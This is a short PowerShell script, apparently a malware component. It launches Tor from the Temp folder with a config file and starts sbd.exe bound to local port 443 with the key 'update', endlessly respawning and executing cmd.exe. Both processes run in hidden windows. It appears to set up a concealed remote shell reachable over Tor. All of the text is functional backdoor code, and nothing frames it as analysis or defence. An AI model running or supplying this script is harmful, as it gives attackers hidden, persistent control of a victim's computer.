$Path = "$env:Temp\package"
Start-Process -FilePath "$Path\tor.exe" -ArgumentList "-f","$Path\config" -WindowStyle hidden;
Start-Process "$Path\sbd.exe" -ArgumentList "-a","127.0.0.1","-k","update","-r","0","-l","-p","443","-e","cmd.exe" -WindowStyle hidden;
